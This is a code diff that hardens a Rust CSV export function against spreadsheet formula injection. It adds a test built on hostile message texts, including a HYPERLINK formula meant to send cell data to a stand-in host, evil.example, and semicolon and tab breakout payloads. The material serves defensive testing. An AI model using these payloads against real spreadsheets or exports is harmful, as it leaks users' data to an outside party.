@@ -217,16 +217,19 @@ impl<W: Write> ExportWriter<W> {
     }
 }
 
-/// Quotes a CSV cell when needed. Cells starting with `=`, `+`, `-` or `@`
-/// get a leading apostrophe, so a spreadsheet does not run message text as
-/// a formula.
+/// Quotes a CSV cell when needed. Cells starting with `=`, `+`, `-`, `@`,
+/// a tab or a carriage return get a leading apostrophe, so a spreadsheet
+/// does not run message text as a formula. Cells with a semicolon or tab are
+/// quoted too: Excel in German and many other languages splits CSV files at
+/// semicolons, and an unquoted `;=…` in a message would start a new cell
+/// holding a formula.
 fn csv_cell(value: &str) -> String {
-    let value = if value.starts_with(['=', '+', '-', '@']) {
+    let value = if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
         format!("'{value}")
     } else {
         value.to_owned()
     };
-    if value.contains([',', '"', '\n', '\r']) {
+    if value.contains([',', ';', '"', '\t', '\n', '\r']) {
         format!("\"{}\"", value.replace('"', "\"\""))
     } else {
         value
@@ -279,6 +282,57 @@ mod tests {
             "\"Rust, Enjoyers\",10,11,1,2024-05-01T12:00:00+00:00,deleted,\"hi \"\"you\"\"\nthere\",https://cdn/a.png https://cdn/b.txt,attachments/11/1_1_a.png,"
         );
         assert!(lines[2].contains(",would_delete,'=1+1,"));
+    }
+
+    #[test]
+    fn hostile_text_cannot_break_out_of_its_cell() {
+        let mut writer = ExportWriter::new(Vec::new(), ExportFormat::Csv).unwrap();
+        let hostile = [
+            "a;=1+1",
+            "a;=HYPERLINK(\"https://evil.example/?\"&A1)",
+            "\t=1+1",
+            "\r=1+1",
+            "x\";=1+1;\"",
+            "@SUM(1)",
+        ];
+        writer.observe(&started()).unwrap();
+        for (i, text) in hostile.iter().enumerate() {
+            writer.observe(&deleted(i as u64 + 1, text, false)).unwrap();
+        }
+        let text = String::from_utf8(writer.finish().unwrap()).unwrap();
+        // Read back the way Excel does in locales that use semicolons: every
+        // semicolon or tab outside quotes starts a new cell.
+        for separator in [',', ';', '\t'] {
+            for (row, line) in text.lines().skip(1).enumerate() {
+                for cell in split_cells(line, separator) {
+                    let cell = cell.trim_start_matches(['\r', '\n']);
+                    assert!(
+                        !cell.starts_with(['=', '+', '-', '@', '\t']),
+                        "row {row}, split at {separator:?}: {cell:?} in {line:?}"
+                    );
+                }
+            }
+        }
+        // And read with commas, the text comes back whole.
+        let rows = crate::package::parse_csv(text.trim_start_matches('\u{feff}'));
+        for (row, original) in rows[1..].iter().zip(hostile) {
+            let content = row[6].strip_prefix('\'').unwrap_or(&row[6]);
+            assert_eq!(content, original);
+        }
+    }
+
+    /// Cells of a line split at `separator`, respecting quotes.
+    fn split_cells(line: &str, separator: char) -> Vec<String> {
+        let (mut cells, mut cell, mut quoted) = (Vec::new(), String::new(), false);
+        for c in line.chars() {
+            match c {
+                '"' => quoted = !quoted,
+                c if c == separator && !quoted => cells.push(std::mem::take(&mut cell)),
+                c => cell.push(c),
+            }
+        }
+        cells.push(cell);
+        cells
     }
 
     #[test]
